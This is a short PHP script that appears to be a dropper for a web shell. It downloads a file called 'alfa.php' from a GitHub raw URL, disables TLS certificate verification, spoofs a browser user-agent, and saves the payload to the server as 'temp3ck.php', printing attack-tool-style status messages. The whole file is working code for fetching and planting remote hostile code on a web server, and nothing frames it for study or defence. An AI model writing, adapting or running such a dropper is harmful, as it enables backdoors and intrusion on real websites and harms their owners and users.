<?php
$url = "https://raw.githubusercontent.com/shootcannon/whatdoyouthink/refs/heads/main/alfa.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
$content = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if($http_code == 200 && $content !== false){
    $filename = "temp3ck.php";
    file_put_contents($filename, $content);
    echo "[+] File downloaded successfully: " . $filename . "\n";
    echo "[+] Size: " . strlen($content) . " bytes\n";
    

} else {
    echo "[-] Download failed! HTTP Code: " . $http_code . "\n";
}
?>
